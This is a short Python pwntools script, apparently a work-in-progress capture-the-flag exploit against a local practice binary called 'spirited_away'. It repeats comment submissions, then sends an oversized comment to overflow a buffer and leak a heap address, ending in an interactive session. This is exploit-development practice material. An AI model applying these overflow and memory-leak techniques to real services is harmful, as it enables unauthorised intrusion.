from pwn import *
import pdb

p = process('/home/len/pwnable/spirited_away')


def set_name(name):
    p.sendlineafter('Please enter your name: ', name)


def set_age(age):
    p.sendlineafter('Please enter your age: ', str(age))


def set_reason(reason):
    p.sendlineafter('Why did you came to see this movie? ', reason)


def set_comment(comment):
    p.sendlineafter('Please enter your comment: ', comment)


def set_all(name, age, reason, comment):
    set_name(name)
    set_age(age)
    set_reason(reason)
    set_comment(comment)


if __name__ == '__main__':
    for i in range(100):
        set_all('helo', 28, 'a', 'b' * 0x8)
        p.sendlineafter('Would you like to leave another comment? <y/n>: ',
                        'y')

    pdb.set_trace()
    set_all('helo', 28, 'a', 'b' * 0x50 + '\x10\x10\x10')
    p.recvuntil('Comment: ', drop=True)
    p.recv(0x50+0x4)
    name_addr = u32(p.recv(4))
    print('heap_addr: {:#x}'.format(name_addr))

    p.interactive()
'''
survey
0xfff7ed60

0xfff7eda0
'''